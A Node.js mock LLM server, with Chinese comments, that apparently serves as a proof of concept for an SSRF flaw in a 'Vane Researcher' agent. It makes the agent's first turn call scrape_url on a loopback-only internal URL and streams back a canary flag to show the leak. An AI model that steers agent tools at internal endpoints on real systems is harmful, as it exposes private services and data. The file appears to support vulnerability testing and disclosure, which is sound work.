// OpenAI 兼容的 mock LLM 服务器。
// 作用：确定性驱动 Vane Researcher 的工具调用循环，
// 让 researcher 在第一次迭代就发出 scrape_url 工具调用，目标指向内网 canary。
// 这样可以在不依赖真实 LLM 的情况下 1:1 复现「LLM 返回工具调用 → Playwright 抓取内网 URL」的链路。
import http from 'node:http';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';

const LOG = fileURLToPath(new URL('./mock-llm.log', import.meta.url));
const SSRF_TARGET = process.env.SSRF_TARGET || 'http://127.0.0.1:8787/internal/secret';
let researcherTurns = 0;

function log(line) {
  fs.appendFileSync(LOG, line + '\n');
  console.log(line);
}

function sse(res, obj) {
  res.write(`data: ${JSON.stringify(obj)}\n\n`);
}

const server = http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => (body += c));
  req.on('end', () => {
    const url = req.url;
    let parsed = {};
    try { parsed = JSON.parse(body || '{}'); } catch {}

    log(`\n=== ${new Date().toISOString()} ${req.method} ${url} stream=${!!parsed.stream}`);

    if (url === '/v1/embeddings') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ object: 'list', data: [{ index: 0, embedding: new Array(8).fill(0) }], model: parsed.model }));
      return;
    }

    if (url === '/v1/chat/completions') {
      const hasTools = Array.isArray(parsed.tools) && parsed.tools.length > 0;
      const bodyStr = body;

      if (parsed.stream) {
        res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' });
        if (hasTools) {
          researcherTurns++;
          if (researcherTurns > 1) {
            // 第二次迭代起：不再调用工具，结束研究循环
            log('>>> [researcher turn ' + researcherTurns + '] no further tool calls, ending research loop');
            sse(res, { id: 'chatcmpl-mock', object: 'chat.completion.chunk', created: 1, model: parsed.model,
              choices: [{ index: 0, delta: { role: 'assistant', content: '' }, finish_reason: null }] });
            sse(res, { id: 'chatcmpl-mock', object: 'chat.completion.chunk', created: 1, model: parsed.model,
              choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] });
            res.write('data: [DONE]\n\n');
            res.end();
            return;
          }
          // Researcher 迭代：返回 scrape_url 工具调用（模拟 LLM 决定抓取攻击者指定 URL）
          log('>>> [researcher turn 1] issuing tool_call: scrape_url ' + SSRF_TARGET);
          const args = JSON.stringify({ urls: [SSRF_TARGET] });
          sse(res, { id: 'chatcmpl-mock', object: 'chat.completion.chunk', created: 1, model: parsed.model,
            choices: [{ index: 0, delta: { role: 'assistant', tool_calls: [{ index: 0, id: 'call_scrape_1', type: 'function', function: { name: 'scrape_url', arguments: args } }] }, finish_reason: null }] });
          sse(res, { id: 'chatcmpl-mock', object: 'chat.completion.chunk', created: 1, model: parsed.model,
            choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] });
          res.write('data: [DONE]\n\n');
        } else {
          // Writer 轮：给出最终答案
          log('>>> [writer turn] streaming final answer');
          const answer = 'The page at ' + SSRF_TARGET + ' was fetched by the server-side browser. Its content includes: FLAG: VANE_SSRF_CANARY_8842_THIS_PAGE_IS_NOT_INTERNET_ACCESSIBLE. This demonstrates that Vane fetched a loopback-only internal URL on the server and returned its content to the client.';
          sse(res, { id: 'chatcmpl-mock', object: 'chat.completion.chunk', created: 1, model: parsed.model,
            choices: [{ index: 0, delta: { role: 'assistant', content: answer }, finish_reason: null }] });
          sse(res, { id: 'chatcmpl-mock', object: 'chat.completion.chunk', created: 1, model: parsed.model,
            choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] });
          res.write('data: [DONE]\n\n');
        }
        res.end();
        return;
      }

      // 非流式：classify 或 generateObject(extracted_facts)
      res.writeHead(200, { 'Content-Type': 'application/json' });
      let content;
      if (bodyStr.includes('"classification"')) {
        log('>>> [classify] returning classification (skipSearch=false)');
        content = JSON.stringify({
          classification: { skipSearch: false, personalSearch: false, academicSearch: false, discussionSearch: false, showWeatherWidget: false, showStockWidget: false, showCalculationWidget: false },
          standaloneFollowUp: 'Fetch and summarize the page the user pointed to',
        });
      } else if (bodyStr.includes('extracted_facts')) {
        log('>>> [extractor] returning extracted_facts');
        content = JSON.stringify({ extracted_facts: '- FLAG: VANE_SSRF_CANARY_8842_THIS_PAGE_IS_NOT_INTERNET_ACCESSIBLE' });
      } else {
        log('>>> [non-stream fallback]');
        content = JSON.stringify({ note: 'mock' });
      }
      res.end(JSON.stringify({
        id: 'chatcmpl-mock', object: 'chat.completion', created: 1, model: parsed.model,
        choices: [{ index: 0, message: { role: 'assistant', content }, finish_reason: 'stop' }],
      }));
      return;
    }

    res.writeHead(404); res.end('not found');
  });
});

server.listen(8399, '127.0.0.1', () => console.log('[MOCK-LLM] listening on http://127.0.0.1:8399/v1'));
